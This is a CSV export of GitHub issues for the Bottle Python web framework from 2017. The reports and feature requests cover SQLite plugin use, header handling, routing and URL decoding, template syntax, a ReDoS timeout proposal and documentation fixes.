ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
1011,"SQLite-plugin: possible to use ""db"" outside of route?",2017-11-17T12:52:40Z,2017-11-17T13:00:09Z,,`ProgrammingError,"`ProgrammingError: Cannot operate on a closed database.`","I'm quite new to Python and Bottle but I got an issue using SQLite plugin.

I need to call my database directly from my Python script without going trough a route. Is it possible?

```
from bottle import route, run, template, static_file, request, redirect, install
from bottle_sqlite import SQLitePlugin
install(SQLitePlugin(dbfile=data/db/database.db'))

log_level = db.execute(""SELECT log_level FROM table_settings_general"").fetchone()
#do whatever with log_level

@route('/')
def root():
    #do whatever we want...
```

I keep getting this error:
`ProgrammingError: Cannot operate on a closed database.`

I'm pretty sure there's a way to use ""db"" outside of a route in the main python script but I can't find anything.

Thanks!"
1010,"not able set/update/add response header( parameter - ""Server"") in bottle paste server ?",2017-11-06T08:39:33Z,,,,,"i am trying to explicitly update response header. specially parameter ""Server"" = NULL.
response.set_header('Server', ' ')
response.add_header('Server', ' ')

i am running server with paste as : 
app.run(host='localhost', port=5010, debug=True, server='paste')
not able to make changes for parameter ""Server"". default response i am getting   "" server →PasteWSGIServer/0.5 Python/2.7.13 ""
but able to change other parameter like "" Content_Type "".

but when i am running server without paste as : 
app.run(host='localhost', port=5010, debug=True) 
am able to make changes to all parameters.. 

please suggest me what is the problem and if possible what would be resolution for this ?"
1009,Fix Last-Modifed and Date header formats in static_file for non-engli…,2017-11-05T13:04:25Z,2017-11-06T12:30:02Z,,,,"…sh locales

time.strftime produces locale-dependent date format. At best, this lead to
invalid dates being produced, e. g: 'Ne, 05 lis 2017 12:58:28 GMT'. At worst,
this lead to encoding crashes for dates like 'Út, 31 říj 2017 12:58:28 GMT'

Some code to reproduce the issue

```
#! /usr/bin/env python3

import locale
import os
import bottle
import time

locale.setlocale(locale.LC_TIME, ""cs_CZ.UTF-8"")

print(time.strftime(""%a, %d %b %Y %H:%M:%S GMT"", time.gmtime()))


@bottle.route(""/<path:path>"")
def handle(path):
    return bottle.static_file(path, root=os.path.dirname(__file__))

bottle.run(host=""localhost"", port=""9999"")
```

(wait for tuesday to get it to crash :))"
1008,keyword arguments not working,2017-11-01T14:41:29Z,,,,,"I have no idea why but I am in the situation that keyword arguments are not working. I use this code

```
@route('/hello/<name>')
def greet(name='Stranger'):
    return template('Hello {{name}}, how are you?', name=name)
```
And it becomes a 404 status. If I do it without the argument then it works. This is the strangest thing that happened to me in my life. "
1007,Fixed a sentence,2017-10-27T11:43:09Z,2017-11-06T12:31:24Z,,,,
1006,Fix spelling errors,2017-10-18T14:16:39Z,2017-11-06T12:31:40Z,,,,
1005,Update maifest,2017-10-18T13:03:39Z,2017-11-06T12:32:22Z,,,,This fixes #1004 
1004,Pypi package is missing LICENSE file,2017-10-18T12:51:15Z,2017-11-06T12:32:22Z,,,,"This makes it very difficult to use this package in a yocto build, some kind of license file must be inside the tarball and I have to refer to it and its checksum for the automated QA tests to pass.

This is probably a side effect of #348
"
1003,Change SimpleTemplate default Syntax,2017-10-17T23:33:35Z,,,,,"Is there a way we can change the `default_syntax = '<% %> % {{ }}'` without hacking Bottle so we can use handlebars for vuejs or angular when building templates.
"
1002,Feature Request: Monitor time span of wsgi calls,2017-10-15T13:19:44Z,2017-10-16T10:54:10Z,,,,"Hey

There is a type of attack on webservers called regular expression DOS:
https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS

It uses the fact, that re engines may take a lot of time for processing certain regular expression/string combinations. Using these with bottle e.g. by specifying /\<name:re:(x+x+)+y\> as URL pattern and requesting /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx from the server result in the server getting stuck.

Do you think it might be useful to create an option, where the wsgi() call of Bottle objects is implemented as a new process started and the time used by this process is monitored? Do you see huge drawbacks in e.g. overhead?

I tried to do such an implementation just for the regular expression module. I created a class, which objects have the same interface like the re module, but calls like re.match() are embedded in the runtime checks. In bottle.py, you create one of these objects  and call it re instead of importing re.

Wrapping just the regular expressions into some time monitoring has less side effects than wrapping the complete wsgi() call. But on the other hand, I had a huge problem with passing the return values of the re functions from the created process to the calling one. Objects transferred using multiprocessing.Pipe() need to be pickable. The objects returned by re.match() are not pickable, I had to write a class, which has the same interface like the match objects, but which is pickable. So the code became ugly.

I had to use processes instead of threads, because you can kill processes in a clean manner. Threads have no terminate() method.
I tried to do such an implementation just for the regular expression module. I created a class, which objects have the same interface like the re module, but calls like re.match() are embedded in the runtime checks. In bottle.py, you create one of these objects and call it re instead of importing re.

Wrapping just the regular expressions into some time monitoring has less side effects than wrapping the complete wsgi() call. But on the other hand, I had a huge problem with passing the return values of the re functions from the created process to the calling one. Objects transferred using multiprocessing.Pipe() need to be pickable. The objects returned by re.match() are not pickable, I had to write a class, which has the same interface like the match objects, but which is pickable. So the code became ugly.

I had to use processes instead of threads, because you can kill processes in a clean fashion. Threads have no terminate() method.

I appended this wrapper class, the pickable match class and a small test script.[TimeGuardExample.zip](https://github.com/bottlepy/bottle/files/1385458/TimeGuardExample.zip)





Do you thing the wrapping of whole Bottle.wsgi() is a good idea?"
1001,Explicitly add global variables to the globals dictionary passed to exec statement when executing compiled templates.,2017-10-15T11:35:15Z,,,,,"SimpleTemeplate is implemented as a compiled python code object executed using the builtin function exec(). The global variables visible in the compiled statement are passed as a dictionary. This dictionary now contains explicitly all definitions of the global context, in which exec() is called. Otherwise, specifying a variable in the URL pattern called \_\_builtins\_\_ leads to an empty globals() context, because exec() would not add the globals() definitions implicitly in that case. All calls of builtins in the compiled statement would lead to an exception.
See https://docs.python.org/3/library/functions.html#exec for the implicit definition of necessary global context."
1000,ResourceWarning: unclosed file <_io.BufferedReader... in static_file(),2017-09-26T14:07:30Z,,,,,"We've recently got this error coming from `static_file()` function ([this line](https://github.com/bottlepy/bottle/blob/master/bottle.py#L2910)):

> /usr/lib/python3.5/unittest/case.py:600: ResourceWarning: unclosed file <_io.BufferedReader name='/tmp/20170926_084744_545761.pdf'>
  testMethod()

`with` should fix it as it did in a similar issue: https://github.com/bottlepy/bottle/pull/611. Thanks."
999,Fix typo for todo tutorial line 300 and 301,2017-09-21T18:27:51Z,2017-11-06T12:34:30Z,,,,missing GET method to strip edit and status
998,status and headers of returned Response instances are ignored,2017-09-16T03:56:14Z,,,,,"First reported 2013 #511 the bug is still present in the master branch. Even worse according to the documentation the following should work just fine.

    Response(body='', status=403, headers=headers)

While the `body` argument works the `status` and `headers` arguments have no effect whatsoever.
I am refiling this issue, since the previous one has a misleading title and doesn't mention that it also effects headers.

Having to raise `HTTPResponse` for non-erroneous statuses like redirects doesn't make any semantic sense. If this bug won't get fixed after 4 years it should at least be documented."
997,from bottle import touni,2017-09-12T17:49:27Z,,,,,touni() is called on line 97.
996,Config from command line,2017-09-08T07:15:21Z,2017-09-08T15:54:59Z,,,,"I want to use parameter from command line to enable disable functionnality.
Is there a better way than this injection ?
```python
from bottle import Bottle, run
import argparse

app = Bottle()
@app.route('/')
def home():
    if app.some_parameters:
        return ""Hello world""
    else:
        return ""Hello bottle""

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(""--param"", action='store_true', help=""Some help"")
    args = parser.parse_args()

    app.some_parameters = args.param
    run(app, host='localhost', port=8080)
```
"
995,(v0.13-dev) Can't run aiohttp server,2017-09-07T20:50:35Z,,,ImportError,"ImportError: No module named 'aiohttp.wsgi'","
```
Traceback (most recent call last):
  File ""/Users/mellis/ls-mapped-mode/bottle.py"", line 3709, in run
    server.run(app)
  File ""/Users/mellis/ls-mapped-mode/bottle.py"", line 3511, in run
    from aiohttp.wsgi import WSGIServerHttpProtocol
ImportError: No module named 'aiohttp.wsgi'
Bottle v0.13-dev server starting up (using AiohttpServer())...
```
Apparently aiohttp has obsoleted .wsgi. See https://github.com/aio-libs/aiohttp/issues/1108

Truth be told, my real interest here is to be able to run some background tasks as coroutines without having to resort to subprocesses or threads.  I read your writeup about using gevent but prefer to use asyncio and async/await since these are now built into Python.  Any suggestions?

Thanks!"
994,fixes sqlite3.ProgrammingError: Incorrect number of bindings supplied,2017-09-07T08:56:17Z,2017-09-07T09:01:27Z,,,,
993,Feature Request: meta Plugin,2017-08-22T19:32:43Z,,,,,"Hey,

i am often finding myself implementing model/db pluging´s for Bottle. Since they looked all pretty much the same, i created a MetaPlugin, that take two arguments: a object, representing a instance of the model/db(connection pool), and a associated keyword.

here is what i got:

```
class MetaPlugin(object):
    api = 2

    def __init__(self, model, keyword):
        self.keyword = keyword
        self.model = model

    def setup(self, app):
        for other in app.plugins:
            if not isinstance(other, MetaPlugin):
                continue
            if other.keyword == self.keyword:
                raise PluginError('Found another plugin with the same keyword: {0}'.format(self.keyword))

    def apply(self, callback, context):
        callback_args = inspect.signature(context.callback)
        if self.keyword not in callback_args.parameters:
            return callback

        def wrapper(*args, **kwargs):
            kwargs[self.keyword] = self.model
            rv = callback(*args, **kwargs)
            return rv
        return wrapper
```

this can then simply be used with every model, connection pool object or whatever like:

```
app.install(MetaPlugin(intake, 'm_intake'))
```

i think this migth be something that could be useful for others to. what do you think? should i create a pull request?

Kind Regards"
992,Questions about child processes and manually reloading,2017-08-20T13:06:40Z,2017-08-21T08:59:28Z,,,,"Good day!

I use Bottle + WSGIRefServer and have some questions.

1. In which point of code is child process created?
2. Are there fixed number of child processes or ""one process per request""?
3. How do I limit number of child processes? I want to have <= 1 child process at every moment.
4. How do I *manually* reload server? So I want to reload server by a signal...

Thanks very much!"
991,`FormsDict` documentation,2017-08-20T10:27:26Z,2017-08-21T14:50:49Z,,,,"`FormsDict` documentation [says](http://bottlepy.org/docs/dev/api.html#bottle.FormsDict):

>  Attributes are automatically de- or recoded to match `input_encoding` (default: `‘utf8’`)

> decode(encoding=None)
> Returns a copy with all keys and values de- or recoded to match `input_encoding`. Some libraries (e.g. WTForms) want a unicode dictionary.

* ""to match `input_encoding`"" or ""to match `encoding` or (`input_encoding` if `None`)""?
* ""de- or recoded to match"" or ""de- or recoded to match if `recode_unicode` is `True`, unmodified else""?
* there is a special case in [code](https://github.com/bottlepy/bottle/blob/master/bottle.py#L2193) - `bytes` - what about it?

> getunicode(name, default=None, encoding=None)
> Return the value as a unicode string, or the `default`.

* do you mean ""`unicode`/`str`"" at ""unicode string""?
* ""de- or recoded to match `encoding` (`input_encoding` if `None`)"" have to be added? or ""de- or recoded to match `encoding` (`input_encoding` if `None`) if `recode_unicode` is `True`, unmodified else""?
* there is a special case in [code](https://github.com/bottlepy/bottle/blob/master/bottle.py#L2193) - `bytes` - what about it?

Thoughts (IMHO):

* `getunicode` + ""unicode string"" is ambiguous. Well, maybe it wasn't for Python 2 period... But it's not a Unicode string in fact.
* is `recode_unicode` needness in public API?
* Let's write these docs more clearly?.. :smile: 
* Couldn't we parse (using `input_encoding`) headers *initially*? Then `recode_unicode` and `encoding` arguments are needless...

Thanks!"
990,pre-urldecode causes path parameters to become part of the route,2017-08-20T07:40:58Z,2017-08-21T10:02:19Z,,,,"Hi,

It appears that bottle pre-urldecodes the raw path string prior to passing it to the routing engine.
This has a couple of weird quirks and also probably violates the spirit of the HTTP spec relating to path handling (<https://tools.ietf.org/html/rfc3986#section-3.3>). In particular, this results in path segments consisting of path-like values being hoisted to the top level of the URL for routing purposes, and missing dynamic routes that should match. This prevents the path from being routed correctly, unless there is a `:path` wildcard filter applied. However, if this filter is applied, the `Request.fullpath` variable will not contain the correct string and will contain the post-decode ""resolved"" path.

For example, consider the URL: `http://127.0.0.1:8080/hello/foo%2fbar%2fbaz/world`

And the following code:
```python
from bottle import route, run, template, request

@route('/hello/<xmlxpath>/world')
def hello(xmlxpath):
    return template('<b>xmlxpath: {{xmlxpath}}<br>fullpath: {{fullpath}}</b>',
                    xmlxpath=xmlxpath, fullpath=request.fullpath)

run(host='localhost', port=8080)
```

The expected behavior is that the `hello` function will be called and that the following will render:

```
xmlxpath: foo/bar/baz
fullpath: /hello/foo%2fbar%2fbaz/world
```

The actual behavior is that the request 404s.

If we ""fix"" the code by adding a `:path` filter to the `<xmlxpath>` wildcard, as below, the same output is expected.

```python
from bottle import route, run, template, request

@route('/hello/<xmlxpath:path>/world')
def hello(xmlxpath):
    return template('<b>xmlxpath: {{xmlxpath}}<br>fullpath: {{fullpath}}</b>',
                    xmlxpath=xmlxpath, fullpath=request.fullpath)

run(host='localhost', port=8080)
```

However, the actual output is the following:

```
xmlxpath: foo/bar/baz
fullpath: /hello/foo/bar/baz/world
```

In the above, the fullpath contains a URL-decoded `<xmlpath>` segment value, which does not preserve the semantics of what was actually requested. However the issue goes deeper than this. Instead, consider the URL: `http://127.0.0.1:8080/hello/foo%2fbar%2f..%2f..%2fbaz/world`

The expected result of the page is the following:

```
xmlxpath: foo/bar/../../baz
fullpath: /hello/foo%2fbar%2f..%2f..%2fbaz/world
```

However, the actual result is the following:

```
xmlxpath: foo/bar/../../baz
fullpath: /hello/baz/world
```

In this case, not only is the path segment not preserved, it is pre-resolved in the fullpath.

Based on the RFC's definition of a path segment, both in structure and purpose, this behavior is troublesome as path segments are to be considered ""considered opaque by the generic syntax."" Furthermore, it goes on to state ""URI producing applications often use the reserved characters allowed in a segment to delimit scheme-specific or dereference-handler-specific subcomponents.""

While it would be tempting to say that ensuring the `Request.fullpath` value has the actual full path of the request would be enough to fix this, the pre-urldecoding behavior is already arguably ""wrong"" given the spec — most other web frameworks' (across languages) routing behaviors for this sort of route parameter syntax follow the spec as described — and `:path` behavior should be the default.

"
989,Support dict as input for add_header(),2017-08-07T19:02:15Z,,,,,"Currently i'm adding multiple headers like this:
```
headers = {'some_header' : 'some_value', 'more_header' : 'more_value'}
for h, v in headers.items():
   add_header(h, v)
```

Wouldn't it be convenient  if `add_header()` supported multiple headers, as name/value pairs in a dict?
(and `set_header()` as well)


I think this could be easily done with something like:
```
if type(arg) == dict:
  for name, value in arg.items():
    self._headers.setdefault(_hkey(name), []).append(_hval(value))
else:
  self._headers.setdefault(_hkey(name), []).append(_hval(value))
```

Am missing something or isn't there a good reason that this coudn't be implemented?"
